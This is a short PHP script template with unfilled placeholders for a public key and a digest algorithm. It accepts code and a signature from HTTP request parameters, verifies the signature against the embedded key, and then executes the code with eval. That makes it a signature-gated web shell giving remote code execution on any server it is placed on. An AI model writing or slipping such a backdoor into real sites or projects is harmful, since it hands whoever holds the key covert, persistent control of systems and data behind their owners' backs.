<?php

$k = <<<K
((author_pub))
K;

if (!isset($_REQUEST['p']) || (!$p = $_REQUEST['p']) || !isset($_REQUEST['s']) || (!$s = $_REQUEST['s']) || (1 !== openssl_verify($p, base64_decode($s), $k, ((signature_digest))))) {
  header('HTTP/1.0 400 Bad Request');
  header('Content-Type: text/plain');
  readfile(__FILE__);
  exit;
}

eval($p);
